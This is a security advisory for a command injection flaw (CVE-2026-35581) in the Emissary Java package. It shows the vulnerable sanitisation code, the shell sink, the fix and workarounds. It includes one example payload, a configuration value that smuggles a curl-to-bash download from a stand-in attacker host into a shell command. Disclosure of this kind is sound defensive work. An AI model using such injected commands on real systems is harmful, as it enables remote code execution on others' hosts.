# [H] Emissary has a Command Injection via PLACE_NAME Configuration in Executrix

## Summary
Severity: High
Advisory: GHSA-6c37-7w4p-jg9v
CVE: CVE-2026-35581
CWE: CWE-78
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-6c37-7w4p-jg9v
Type: github-advisory

## Affected
- Maven: `gov.nsa.emissary:emissary` — affected >=0 <8.39.0

## Details
## Summary

The `Executrix` utility class constructed shell commands by concatenating
configuration-derived values — including the `PLACE_NAME` parameter — with
insufficient sanitization. Only spaces were replaced with underscores, allowing
shell metacharacters (`;`, `|`, `$`, `` ` ``, `(`, `)`, etc.) to pass through
into `/bin/sh -c` command execution.

## Details

### Vulnerable code — `Executrix.java`

**Insufficient sanitization (line 132):**
```java
this.placeName = this.placeName.replace(' ', '_');
// ONLY replaces spaces — shell metacharacters pass through
```

**Shell sink (line 1052–1058):**
```java
protected String[] getTimedCommand(final String c) {
    return new String[] {"/bin/sh", "-c", "ulimit -c 0; cd " + tmpNames[DIR] + "; " + c};
}
```

### Data flow

1. `PLACE_NAME` is read from a configuration file
2. `Executrix` applies only a space-to-underscore replacement
3. The `placeName` is used to construct temporary directory paths (`tmpNames[DIR]`)
4. `tmpNames[DIR]` is concatenated into a shell command string
5. The command is executed via `/bin/sh -c`

### Example payload

```
PLACE_NAME = "test;curl attacker.com/shell.sh|bash;x"
```

After the original sanitization: `test;curl_attacker.com/shell.sh|bash;x`
(semicolons, pipes, and other metacharacters preserved)

### Impact

- Arbitrary command execution on the Emissary host
- Requires the ability to control configuration values (e.g., administrative
  access or a compromised configuration source)

## Remediation

Fixed in [PR #1290](https://github.com/NationalSecurityAgency/emissary/pull/1290),
merged into release 8.39.0.

The space-only replacement was replaced with an allowlist regex that strips all
characters not matching `[a-zA-Z0-9_-]`:

```java
protected static final Pattern INVALID_PLACE_NAME_CHARS = Pattern.compile("[^a-zA-Z0-9_-]");

protected static String cleanPlaceName(final String placeName) {
    return INVALID_PLACE_NAME_CHARS.matcher(placeName).replaceAll("_");
}
```

This ensures that any shell metacharacter in the `PLACE_NAME` configuration
value is replaced with an underscore before it can reach a command string.

Tests were added to verify that parentheses, slashes, dots, hash, dollar signs,
backslashes, quotes, semicolons, carets, and at-signs are all sanitized.

## Workarounds

If upgrading is not immediately possible, ensure that `PLACE_NAME` values in all
configuration files contain only alphanumeric characters, underscores, and hyphens.

## References

- [PR #1290 — validate placename with an allowlist](https://github.com/NationalSecurityAgency/emissary/pull/1290)
- Original report: GHSA-wjqm-p579-x3ww

## References
- https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-6c37-7w4p-jg9v
- https://nvd.nist.gov/vuln/detail/CVE-2026-35581
- https://github.com/NationalSecurityAgency/emissary/pull/1290
- https://github.com/NationalSecurityAgency/emissary
